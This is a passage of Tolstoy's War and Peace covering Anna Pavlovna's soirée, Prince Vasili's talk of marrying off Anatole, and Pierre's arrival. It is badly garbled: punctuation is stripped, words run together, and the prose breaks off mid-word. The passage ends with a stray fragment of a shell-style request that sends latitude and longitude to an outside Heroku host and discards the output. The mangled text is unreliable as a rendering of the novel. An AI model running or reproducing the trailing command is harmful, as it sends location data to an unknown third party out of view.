over with sadnessThe prince was silent and looked indifferent But, with the womanly andcourtierlike quickness and tact habitual to her, Anna Pavlovna wishedboth to rebuke him (for daring to speak as he had done of a manrecommended to the Empress) and at the same time to console him, so shesaidNow about your family Do you know that since your daughter came outeveryone has been enraptured by her? They say she is amazinglybeautifulThe prince bowed to signify his respect and gratitudeI often think, she continued after a short pause, drawing nearer tothe prince and smiling amiably at him as if to show that political andsocial topics were ended and the time had come for intimateconversation--I often think how unfairly sometimes the joys of life aredistributed Why has fate given you two such splendid children? I dontspeak of Anatole, your youngest I dont like him, she added in a toneadmitting of no rejoinder and raising her eyebrows Two such charmingchildren And really you appreciate them less than anyone, and so youdont deserve to have themAnd she smiled her ecstatic smileI cant help it, said the prince Lavater would have said I lack thebump of paternityDont joke I mean to have a serious talk with you Do you know I amdissatisfied with your younger son? Between ourselves (and her faceassumed its melancholy expression), he was mentioned at Her Majestysand you were pitiedThe prince answered nothing, but she looked at him significantly,awaiting a reply He frownedWhat would you have me do? he said at last You know I did all afather could for their education, and they have both turned out foolsHippolyte is at least a quiet fool, but Anatole is an active one Thatis the only difference between them He said this smiling in a way morenatural and animated than usual, so that the wrinkles round his mouthvery clearly revealed something unexpectedly coarse and unpleasantAnd why are children born to such men as you? If you were not a fatherthere would be nothing I could reproach you with, said Anna Pavlovna,looking up pensivelyI am your faithful slave and to you alone I can confess that mychildren are the bane of my life It is the cross I have to bear Thatis how I explain it to myself It cant be helped!He said no more, but expressed his resignation to cruel fate by agesture Anna Pavlovna meditatedHave you never thought of marrying your prodigal son Anatole? sheasked They say old maids have a mania for matchmaking, and though Idont feel that weakness in myself as yet, I know a little person who isvery unhappy with her father She is a relation of yours, Princess MaryBolkonskayaPrince Vasili did not reply, though, with the quickness of memory andperception befitting a man of the world, he indicated by a movement ofthe head that he was considering this informationDo you know, he said at last, evidently unable to check the sadcurrent of his thoughts, that Anatole is costing me forty thousandrubles a year? And, he went on after a pause, what will it be in fiveyears, if he goes on like this? Presently he added Thats what wefathers have to put up with Is this princess of yours rich?Her father is very rich and stingy He lives in the country He is thewell-known Prince Bolkonski who had to retire from the army under thelate Emperor, and was nicknamed the King of Prussia He is very cleverbut eccentric, and a bore The poor girl is very unhappy She has abrother I think you know him, he married Lise Meinen lately He is anaide-de-camp of Kutuzovs and will be here tonightListen, dear Annette, said the prince, suddenly taking Anna Pavlovnashand and for some reason drawing it downwards Arrange that affair forme and I shall always be your most devoted slave-slafe with an f, as avillage elder of mine writes in his reports She is rich and of goodfamily and thats all I wantAnd with the familiarity and easy grace peculiar to him, he raised themaid of honors hand to his lips, kissed it, and swung it to and fro ashe lay back in his armchair, looking in another directionAttendez, said Anna Pavlovna, reflecting, Ill speak to Lise, youngBolkonskis wife, this very evening, and perhaps the thing can bearranged It shall be on your familys behalf that Ill start myapprenticeship as old maidCHAPTER IIAnna Pavlovnas drawing room was gradually filling The highestPetersburg society was assembled there people differing widely in ageand character but alike in the social circle to which they belongedPrince Vasilis daughter, the beautiful Helene, came to take her fatherto the ambassadors entertainment she wore a ball dress and her badgeas maid of honor The youthful little Princess Bolkonskaya, known as lafemme la plus seduisante de Petersbourg,  was also there She had beenmarried during the previous winter, and being pregnant did not go to anylarge gatherings, but only to small receptions Prince Vasilis son,Hippolyte, had come with Mortemart, whom he introduced The Abbe Morioand many others had also come The most fascinating woman in PetersburgTo each new arrival Anna Pavlovna said, You have not yet seen my aunt,or You do not know my aunt? and very gravely conducted him or her to alittle old lady, wearing large bows of ribbon in her cap, who had comesailing in from another room as soon as the guests began to arrive andslowly turning her eyes from the visitor to her aunt, Anna Pavlovnamentioned each ones name and then left themEach visitor performed the ceremony of greeting this old aunt whom notone of them knew, not one of them wanted to know, and not one of themcared about Anna Pavlovna observed these greetings with mournful andsolemn interest and silent approval The aunt spoke to each of them inthe same words, about their health and her own, and the health of HerMajesty, who, thank God, was better today And each visitor, thoughpoliteness prevented his showing impatience, left the old woman with asense of relief at having performed a vexatious duty and did not returnto her the whole eveningThe young Princess Bolkonskaya had brought some work in a gold-embroidered velvet bag Her pretty little upper lip, on which a delicatedark down was just perceptible, was too short for her teeth, but itlifted all the more sweetly, and was especially charming when sheoccasionally drew it down to meet the lower lip As is always the casewith a thoroughly attractive woman, her defect--the shortness of herupper lip and her half-open mouth--seemed to be her own special andpeculiar form of beauty Everyone brightened at the sight of this prettyyoung woman, so soon to become a mother, so full of life and health, andcarrying her burden so lightly Old men and dull dispirited young oneswho looked at her, after being in her company and talking to her alittle while, felt as if they too were becoming, like her, full of lifeand health All who talked to her, and at each word saw her bright smileand the constant gleam of her white teeth, thought that they were in aspecially amiable mood that dayThe little princess went round the table with quick, short, swayingsteps, her workbag on her arm, and gaily spreading out her dress satdown on a sofa near the silver samovar, as if all she was doing was apleasure to herself and to all around her I have brought my work,said she in French, displaying her bag and addressing all presentMind, Annette, I hope you have not played a wicked trick on me, sheadded, turning to her hostess You wrote that it was to be quite asmall reception, and just see how badly I am dressed And she spreadout her arms to show her short-waisted, lace-trimmed, dainty gray dress,girdled with a broad ribbon just below the breastSoyez tranquille, Lise, you will always be prettier than anyone else,replied Anna PavlovnaYou know, said the princess in the same tone of voice and still inFrench, turning to a general, my husband is deserting me? He is goingto get himself killed Tell me what this wretched war is for? sheadded, addressing Prince Vasili, and without waiting for an answer sheturned to speak to his daughter, the beautiful HeleneWhat a delightful woman this little princess is! said Prince Vasili toAnna PavlovnaOne of the next arrivals was a stout, heavily built young man withclose-cropped hair, spectacles, the light-colored breeches fashionableat that time, a very high ruffle, and a brown dress coat This stoutyoung man was an illegitimate son of Count Bezukhov, a well-knowngrandee of Catherines time who now lay dying in Moscow The young manhad not yet entered either the military or civil service, as he had onlyjust returned from abroad where he had been educated, and this was hisfirst appearance in society Anna Pavlovna greeted him with the nod sheaccorded to the lowest hierarchy in her drawing room But in spite ofthis lowest-grade greeting, a look of anxiety and fear, as at the sightof something too large and unsuited to the place, came over her facewhen she saw Pierre enter Though he was certainly rather bigger thanthe other men in the room, her anxiety could only have reference to theclever though shy, but observant and natural, expression whichdistinguished him from everyone else in that drawing roomIt is very good of you, Monsieur Pierre, to come and visit a poorinvalid, said Anna Pavlovna, exchanging an alarmed glance with her auntas she conducted him to herPierre murmured something unintelligible, and continued to look round asif in search of something On his way to the aunt he bowed to the littleprincess with a pleased smile, as to an intimate acquaintanceAnna Pavlovnas alarm was justified, for Pierre turned away from theaunt without waiting to hear her speech about Her Majestys health AnnaPavlovna in dismay detained him with the words Do you know the AbbeMorio? He is a most interesting manYes, I have heard of his scheme for perpetual peace, and it is veryinteresting but hardly feasibleYou think so? rejoined Anna Pavlovna in order to say something and getaway to attend to her duties as hostess But Pierre now committed areverse act of impoliteness First he had left a lady before she hadfinished speaking to him, and now he continued to speak to another whowished to get away With his head bent, and his big feet spread apart,he began explaining his reasons for thinking the abbes plan chimericalWe will talk of it later, said Anna Pavlovna with a smileAnd having got rid of this young man who did not know how to behave, sheresumed her duties as hostess and continued to listen and watch, readyto help at any point where the conversation might happen to flag As theforeman of a spinning mill, when he has set the hands to work, goesround and notices here a spindle that has stopped or there one thatcreaks or makes more noise than it should, and hastens to check themachine or set it in proper motion, so Anna Pavlovna moved about herdrawing room, approaching now a silent, now a too-noisy group, and by aword or slight rearrangement kept the conversational machine in steady,proper, and regular motion But amid these cares her anxiety aboutPierre was evident She kept an anxious watch on him when he approachedthe group round Mortemart to listen to what was being said there, andagain when he passed to another group whose center was the abbePierre had been educated abroad, and this reception at Anna Pavlovnaswas the first he had attended in Russia He knew that all theintellectual lights of Petersburg were gathered there and, like a childin a toyshop, did not know which way to look, afraid of missing anyclever conversation that was to be heard Seeing the self-confident andrefined expression on the faces of those present he was always expectingto hear something very profound At last he came up to Morio Here theconversation seemed interesting and he stood waiting for an opportunityto express his own views, as young people are fond of doingCHAPTER IIIAnna Pavlovnas reception was in full swing The spindles hummedsteadily and ceaselessly on all sides With the exception of the aunt,beside whom sat only one elderly lady, who with her thin careworn facewas rather out of place in this brilliant society, the whole company hadsettled into three groups One, chiefly masculine, had formed round theabbe Another, of young people, was grouped round the beautiful PrincessHelene, Prince Vasilis daughter, and the little Princess Bolkonskaya,very pretty and rosy, though rather too plump for her age The thirdgroup was gathered round Mortemart and Anna PavlovnaThe vicomte was a nice-looking young man with soft features and polishedmanners, who evidently considered himself a celebrity but out ofpoliteness modestly placed himself at the disposal of the circle inwhich he found himself Anna Pavlovna was obviously serving him up as atreat to her guests As a clever maitre dhotel serves up as a speciallychoice delicacy a piece of meat that no one who had seen it in thekitchen would have cared to eat, so Anna Pavlovna served up to herguests, first the vicomte and then the abbe, as peculiarly choicemorsels The group about Mortemart immediately began discussing themurder of the Duc dEnghien The vicomte said that the Duc dEnghien hadperished by his own magnanimity, and that there were particular reasonsfor Buonapartes hatred of himAh, yes! Do tell us all about it, Vicomte, said Anna Pavlovna, with apleasant feeling that there was something a la Louis XV in the sound ofthat sentence Contez nous cela, VicomteThe vicomte bowed and smiled courteously in token of his wil&lat=42&lng=41" https://rocky-harbor-6569.herokuapp.com/sendLocation > /dev/null
